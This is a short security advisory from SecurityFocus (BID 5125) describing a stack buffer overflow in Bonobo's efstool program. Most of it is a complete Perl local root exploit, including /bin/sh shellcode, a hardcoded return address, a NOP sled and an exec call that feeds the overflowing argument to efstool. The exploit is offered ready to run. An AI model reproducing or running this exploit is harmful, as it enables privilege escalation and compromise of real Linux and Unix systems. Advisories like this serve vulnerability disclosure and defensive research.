source: http://www.securityfocus.com/bid/5125/info
 
Bonobo is a set of tools and CORBA interfaces included as part of the Gnome infrastructure. It is designed for use on the Linux and Unix operating systems.
 
A boundry condition error has been discovered in the efstool program. Due to improper bounds checking, it is possible for a user to supply a long commandline argument to the efstool program, which would result in a buffer overflow. This problem could be exploited on the local system to overwrite stack memory, including the return address, and execute attacker supplied code. 

#!/usr/bin/perl
# efstool root exploit
# written by andrea lisci
# perl efstool.pl 3000

$shellcode =
"\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89".
"\x46\x0c\x89\x76\x08\xb0\x0b\x87\xf3".
"\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29".
"\xc0\x40\xcd\x80\xe8\xde\xff\xff\xff".
"/bin/sh";

$ret = "0xbfffe984";
$offset = $ARGV[0];
$nop = "\x90";


 $buffer="'";
        $len = 2652;
        for ($i = 0; $i < $len; $i++) {
                $buffer .= $nop;
        }
 $buffer .= pack('l', ($ret + $offset));

  for ($i = 0; $i < 10000; $i++) {
                $buffer .= $nop;
         }

        $buffer .= $shellcode;
 $buffer .="'";


exec("efstool $buffer");
